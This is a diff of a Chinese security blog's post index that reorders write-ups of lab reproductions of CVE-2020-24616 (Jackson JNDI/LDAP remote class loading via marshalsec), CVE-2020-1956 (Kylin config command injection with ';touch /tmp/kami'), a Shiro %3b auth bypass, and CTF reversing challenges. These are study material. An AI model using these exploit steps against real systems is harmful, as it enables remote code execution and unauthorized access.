@@ -559,40 +559,6 @@
       </categories>
   </entry>
   <entry>
-    <title>0x04CVE-2020-24616复现</title>
-    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
-<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
-<a id="more"></a>
-
-<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
-<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
-<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">
-
-<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
-<p>编写exploid文件：</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
-<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
-<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
-<p>开启服务端：</p>
-<p>python3 -m http.server 8888</p>
-<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
-<p>启动LDAP：</p>
-<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
-<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
-<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>jackson</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0x04Xctf进阶刷题-2</title>
     <url>/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/</url>
     <content><![CDATA[<p>XCTF进阶刷题-2</p>
@@ -771,6 +737,65 @@
       </categories>
   </entry>
   <entry>
+    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
+    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
+<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
+<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
+<a id="more"></a>
+
+<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
+<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
+<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
+
+<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
+<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
+<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
+<p>0x002 发包，可以看到返回200</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
+<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
+<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
+<p>0x002 改包，即可</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
+<p>这里有一个额外的知识：burp的collaborator模块</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>kylin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x05Xctf进阶刷题-3 --更新中</title>
+    <url>/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/</url>
+    <content><![CDATA[<p>XCTF进阶刷题-3</p>
+<a id="more"></a>
+
+<h5 id="0x01-easyre-153（sigchld）"><a href="#0x01-easyre-153（sigchld）" class="headerlink" title="0x01 easyre-153（sigchld）"></a>0x01 easyre-153（sigchld）</h5><p>ida分析主函数，了解了sigchild后，猜测if(!v5)这里应该是属于子进程，动态调试看看</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144348053.png" alt="image-20201126144348053"></p>
+<p>运行后会接收到信号值tid</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144442776.png" alt="image-20201126144442776"></p>
+<p>v6 = v5就是对比esp+24h和esp+20h，输入tid值后发现还是不对，对比后尝试输入tid+2即可（不知道原因</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144950878.png" alt="image-20201126144950878"></p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144850862.png" alt="image-20201126144850862"></p>
+<p>然后就会继续运行，看到flag_is_not_here我愣住了，还以为理解错了</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126141821555.png" alt="image-20201126141821555"></p>
+<p>去看看lol函数，发现是对buf做一些操作，buf就是69800那一串数字，可以动态看看最后生成的字符串，就是rhelheg，即flag</p>
+<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126143402449.png" alt="image-20201126143402449"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
     <title>0x05Cve-2020-16898 复现</title>
     <url>/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="Cve-2020-16898-复现"><a href="#Cve-2020-16898-复现" class="headerlink" title="Cve-2020-16898 复现"></a>Cve-2020-16898 复现</h3><p>参考：</p>
@@ -838,85 +863,37 @@
       </tags>
   </entry>
   <entry>
-    <title>0x05Xctf进阶刷题-3 --更新中</title>
-    <url>/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/</url>
-    <content><![CDATA[<p>XCTF进阶刷题-3</p>
+    <title>0x04CVE-2020-24616复现</title>
+    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
+<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
 <a id="more"></a>
 
-<h5 id="0x01-easyre-153（sigchld）"><a href="#0x01-easyre-153（sigchld）" class="headerlink" title="0x01 easyre-153（sigchld）"></a>0x01 easyre-153（sigchld）</h5><p>ida分析主函数，了解了sigchild后，猜测if(!v5)这里应该是属于子进程，动态调试看看</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144348053.png" alt="image-20201126144348053"></p>
-<p>运行后会接收到信号值tid</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144442776.png" alt="image-20201126144442776"></p>
-<p>v6 = v5就是对比esp+24h和esp+20h，输入tid值后发现还是不对，对比后尝试输入tid+2即可（不知道原因</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144950878.png" alt="image-20201126144950878"></p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144850862.png" alt="image-20201126144850862"></p>
-<p>然后就会继续运行，看到flag_is_not_here我愣住了，还以为理解错了</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126141821555.png" alt="image-20201126141821555"></p>
-<p>去看看lol函数，发现是对buf做一些操作，buf就是69800那一串数字，可以动态看看最后生成的字符串，就是rhelheg，即flag</p>
-<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126143402449.png" alt="image-20201126143402449"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
-    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
-<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
-<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
-<a id="more"></a>
+<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
+<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
+<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">
 
-<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
-<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
-<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
-
-<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
-<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
-<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
-<p>0x002 发包，可以看到返回200</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
-<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
-<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
-<p>0x002 改包，即可</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
-<p>这里有一个额外的知识：burp的collaborator模块</p>
+<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
+<p>编写exploid文件：</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
+<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
+<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
+<p>开启服务端：</p>
+<p>python3 -m http.server 8888</p>
+<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
+<p>启动LDAP：</p>
+<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
+<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
+<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
+<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>kylin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x07cve-2020-13933复现</title>
-    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
-<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
-<a id="more"></a>
-
-<p>然后运行，访问，抓包即可</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
-<p>访问test，成功</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
-<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
-<p>进行%3b的操作，绕过登录访问到了页面内容</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>apaches shiro</tag>
+        <tag>jackson</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -951,17 +928,17 @@
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20201201145640995.png" alt="image-20201201145640995"></p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20201201150351743.png" alt="image-20201201150351743"></p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20201201154732373.png" alt="image-20201201154732373"></p>
-<h5 id="0x05-新年快乐-2021-1-5-容易题"><a href="#0x05-新年快乐-2021-1-5-容易题" class="headerlink" title="0x05 新年快乐 2021.1.5 容易题"></a>0x05 新年快乐 2021.1.5 容易题</h5><p>好久没做题了，最近在重刷408的一些知识来着…</p>
+<h5 id="0x05-新年快乐-2021-1-5"><a href="#0x05-新年快乐-2021-1-5" class="headerlink" title="0x05 新年快乐 2021.1.5"></a>0x05 新年快乐 2021.1.5</h5><p>好久没做题了，最近在重刷408的一些知识来着…</p>
 <p>upx脱壳</p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210105142217660.png" alt="image-20210105142217660"></p>
 <p>啊这，flag就很明显是HappyNewYear!了</p>
-<h5 id="0x06-MRCTF2020-Transform1-容易题"><a href="#0x06-MRCTF2020-Transform1-容易题" class="headerlink" title="0x06 [MRCTF2020]Transform1 容易题"></a>0x06 [MRCTF2020]Transform1 容易题</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span><br><span class="line">#define HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span><br><span class="line">#define LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span><br><span class="line">#define HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span><br></pre></td></tr></table></figure>
+<h5 id="0x06-MRCTF2020-Transform1"><a href="#0x06-MRCTF2020-Transform1" class="headerlink" title="0x06 [MRCTF2020]Transform1"></a>0x06 [MRCTF2020]Transform1</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span><br><span class="line">#define HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span><br><span class="line">#define LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span><br><span class="line">#define HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span><br></pre></td></tr></table></figure>
 
 <p>无壳，主函数如下：</p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210111101152811.png" alt="image-20210111101152811"></p>
 <p>流程：输入的字符串存储到v6，然后根据dword_40f040[i]的顺序将v6的值赋给byte_414040，然后和dword_40f040[i]的低8位做异或，得到的值和byte_40f0e0相同即可</p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210111101618314.png" alt="image-20210111101618314"></p>
-<h5 id="0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）"><a href="#0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）" class="headerlink" title="0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）"></a>0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）</h5><p>无壳</p>
+<h5 id="0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）2021-1-12"><a href="#0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）2021-1-12" class="headerlink" title="0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）2021.1.12"></a>0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）2021.1.12</h5><p>无壳</p>
 <p>主函数，前五位可知是actf{，最后一位是}，中间我们输入的字符经过了sub_55D038那个函数的判定</p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210112173435652.png" alt="image-20210112173435652"></p>
 <p>进入这个函数，特别长，3000行，反编译需要久一点，可以看出我们输入的字符经过一大堆异或操作，最后和规定的字符对比，同时不符合的话会返回错误信息，可以知道错误在第几位，因此可以选择爆破</p>
@@ -978,6 +955,18 @@
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210112173902013.png" alt="image-20210112173902013"></p>
 <p>运行脚本即可得到flag</p>
 <p><img src="/2020/11/30/0x06buuctfWP-1/image-20210112172937305.png" alt="image-20210112172937305"></p>
+<h5 id="0x08-MRCTF2020-PixelShooter（unity-安卓）2021-1-13"><a href="#0x08-MRCTF2020-PixelShooter（unity-安卓）2021-1-13" class="headerlink" title="0x08 [MRCTF2020]PixelShooter（unity/安卓）2021.1.13"></a>0x08 [MRCTF2020]PixelShooter（unity/安卓）2021.1.13</h5><p>下载下来是一个apk，运行了下发现是个游戏</p>
+<p><img src="/2020/11/30/0x06buuctfWP-1/image-20210113170627702.png" alt="image-20210113170627702"></p>
+<p>看来flag就是要打到一定的分数</p>
+<p>用apktool反编译，找了下关键语句，发现并没有，陷入僵局</p>
+<p><img src="/2020/11/30/0x06buuctfWP-1/image-20210113170709008.png" alt="image-20210113170709008"></p>
+<p>搜索了下unity相关信息：<a href="https://blog.csdn.net/weixin_44058342/article/details/87940908">https://blog.csdn.net/weixin_44058342/article/details/87940908</a></p>
+<p>原来unity的数据一般存在别的地方</p>
+<p>用apktoolbox对apk进行反编译，提取出 game/assets/bin/data/Managed/Assembly-CSarp.dll，使用 ILSpy 打开即可看到dll，然后搜索flag关键词，找到对应点</p>
+<p><img src="/2020/11/30/0x06buuctfWP-1/image-20210113171010243.png" alt="image-20210113171010243"></p>
+<p>然后就能找到flag了</p>
+<p><img src="/2020/11/30/0x06buuctfWP-1/image-20210113171034487.png" alt="image-20210113171034487"></p>
+<p>是个简单题了</p>
 ]]></content>
       <categories>
         <category>ctf</category>
@@ -1020,24 +1009,27 @@
       </tags>
   </entry>
   <entry>
-    <title>0x09CVE-2020-11113复现</title>
-    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
-<p>这两个漏洞复现方式很像…</p>
+    <title>0x07cve-2020-13933复现</title>
+    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
+<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
 <a id="more"></a>
 
-<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
-<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
-<p>复现成功结果：</p>
-<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
-<p>出现的问题：</p>
-<p>1、有一个包无法下载</p>
-<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
-<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
+<p>然后运行，访问，抓包即可</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
+<p>访问test，成功</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
+<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
